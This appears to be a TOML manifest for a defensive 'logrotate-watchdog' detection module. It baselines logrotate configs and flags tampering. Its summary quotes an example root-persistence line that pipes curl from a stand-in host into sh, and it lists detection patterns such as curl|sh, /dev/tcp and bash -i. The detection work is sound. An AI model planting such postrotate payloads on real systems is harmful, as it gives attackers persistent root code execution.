name        = "logrotate-watchdog"
version     = "0.1.0"
summary     = "Boot + daily delta of the logrotate config (/etc/logrotate.conf + /etc/logrotate.d/*) vs a learned baseline + ownership + suspicious-pattern scan. logrotate runs the prerotate/postrotate/firstaction/lastaction/preremove script blocks AS ROOT on each rotation (typically daily via cron/timer); a rogue script — `postrotate curl evil|sh endscript` — is overlooked root-exec persistence (T1546). World-writable/non-root config or an injection pattern (curl|sh, /dev/tcp, bash -i, tmp/home exec, …) in a script block is the signature. Distinct from logfile-integrity-watchdog (log CONTENT). No-ops cleanly if absent"
category    = "detection"

depends_on  = []
conflicts   = []
provides    = ["logrotate-detection"]
consumes    = []

requires    = [
    { kind = "binary", value = "sha256sum" },
    { kind = "binary", value = "logger" },
    { kind = "binary", value = "systemctl" },
]

instanced = false
phase = "main"

[install]
kind = "script"
apply = "install/apply.sh"
check = "install/check.sh"
uninstall = "install/uninstall.sh"

[profiles]
# `report` (default) — log delta; exit 0
# `enforce`          — exit 1 on any logrotate change
default = "report"
available = ["report", "enforce"]

# MS011 Z-8 / SDD-026 — install-path manifest.
[install_paths]
scope = "system"
paths = [
    "/etc/selfdef/modules/logrotate-watchdog.toml",
    "/usr/local/libexec/selfdef/logrotate-watchdog.sh",
    "/etc/systemd/system/selfdef-logrotate.service",
    "/etc/systemd/system/selfdef-logrotate.timer",
    "/var/lib/selfdef/logrotate-baseline.tsv",
]
